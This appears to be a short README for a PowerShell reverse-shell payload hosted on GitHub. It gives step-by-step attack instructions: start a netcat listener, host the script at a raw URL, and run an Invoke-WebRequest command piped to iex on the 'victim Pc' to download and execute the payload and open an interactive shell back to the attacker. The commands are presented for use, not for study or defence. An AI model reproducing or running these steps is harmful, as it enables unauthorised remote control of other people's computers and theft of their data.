#INSTRUCTIONS : -
1.) Use netcat to setup a listener `nc -nlvp 'port'`. This will start a listener, make sure the port is accessible over the internet and allows inbound connection.<br> 
2.) Upload the script on github or somewhere to get a raw link of the payload like `https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/powershell_reverse.ps1`.<br>
3.) On the victim Pc open powershell and run `Invoke-webRequest "https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/powershell_reverse.ps1" | iex`. Replace this link with your link.<br> 
You will get a connection on your netcat with a fully interactive shell.<br><br><br> 

(UPDATES ARE UNDERWAY TO ADD FEATURES SUCH AS USING [TAB] FOR AUTO_COMPLETION AND OTHER COOL STUFF.
